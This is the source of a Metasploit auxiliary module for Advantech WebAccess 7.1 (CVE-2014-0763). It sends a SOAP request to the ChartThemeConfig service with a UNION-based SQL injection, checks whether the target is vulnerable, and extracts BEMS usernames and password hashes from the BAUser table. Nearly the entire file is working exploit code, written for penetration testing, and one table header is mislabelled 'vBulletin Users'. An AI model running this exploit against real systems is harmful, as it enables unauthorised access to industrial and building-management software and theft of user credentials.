##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include REXML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
        vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
        requests to the ChartThemeConfig web service. This module can be used to extract the BEMS
        site usernames and hashes.
      },
      'References'     =>
        [
          [ 'CVE', '2014-0763' ],
          [ 'ZDI', '14-077' ],
          [ 'OSVDB', '105572' ],
          [ 'BID', '66740' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03' ]
        ],
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Apr 08 2014"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS'])
      ], self.class)
  end

  def build_soap(injection)
    xml = Document.new
    xml.add_element(
        "s:Envelope",
        {
            'xmlns:s' => "http://schemas.xmlsoap.org/soap/envelope/"
        })
    xml.root.add_element("s:Body")
    body = xml.root.elements[1]
    body.add_element(
        "GetThemeNameList",
        {
            'xmlns' => "http://tempuri.org/"
        })
    name_list = body.elements[1]
    name_list.add_element("userName")
    name_list.elements['userName'].text = injection

    xml.to_s
  end

  def do_sqli(injection, mark)
    xml = build_soap(injection)

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path.to_s, "Services", "ChartThemeConfig.svc"),
      'ctype'    => 'text/xml; charset=UTF-8',
      'headers'  => {
          'SOAPAction' => '"http://tempuri.org/IChartThemeConfig/GetThemeNameList"'
      },
      'data'      => xml
    })

    unless res and res.code == 200 and res.body.to_s =~ /#{mark}/
      return nil
    end

    res.body.to_s
  end

  def check
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
    injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
    data = do_sqli(injection, mark)

    if data.nil?
      return Msf::Exploit::CheckCode::Safe
    end

    Msf::Exploit::CheckCode::Vulnerable
  end

  def parse_users(xml, mark)
    doc = Document.new(xml)

    strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string")
    strings_length = strings.length

    unless strings_length > 1
      return
    end

    i = 0
    strings.each do |result|
      next if result.text == mark
      if i < (strings_length / 3)
        @users.push(result.text)
      elsif i < (strings_length / 3) * 2
        @passwords.push(result.text)
      else
        @passwords2.push(result.text)
      end
      i = i + 1
    end

  end

  def run
    print_status("#{peer} - Exploiting sqli to extract users information...")
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    # While installing I can only configure an Access backend, but
    # according to documentation other backends are supported. This
    # injection should be compatible, hopefully, with most backends.
    injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
    injection << "union all select UserName from BAUser where 1=1 "
    injection << "union all select Password from BAUser where 1=1 "
    injection << "union all select Password2 from BAUser where 1=1 "
    injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
    data = do_sqli(injection, mark)

    if data.blank?
      print_error("#{peer} - Error exploiting sqli")
      return
    end

    @users = []
    @passwords = []
    @passwords2 = []

    print_status("#{peer} - Parsing extracted data...")
    parse_users(data, mark)

    if @users.empty?
      print_error("#{peer} - Users not found")
    else
      print_good("#{peer} - #{@users.length} users found!")
    end

    users_table = Rex::Ui::Text::Table.new(
      'Header'  => 'vBulletin Users',
      'Ident'   => 1,
      'Columns' => ['Username', 'Password Hash', 'Password Hash 2']
    )

    for i in 0..@users.length - 1
      report_auth_info({
       :host => rhost,
       :port => rport,
       :user => @users[i],
       :pass => "#{@passwords[i]}:#{@passwords2[i]}",
       :type => "hash",
       :sname => (ssl ? "https" : "http"),
       :proof => data # Using proof to store the hash salt
      })
      users_table << [@users[i], @passwords[i], @passwords2[i]]
    end

    print_line(users_table.to_s)

  end


end

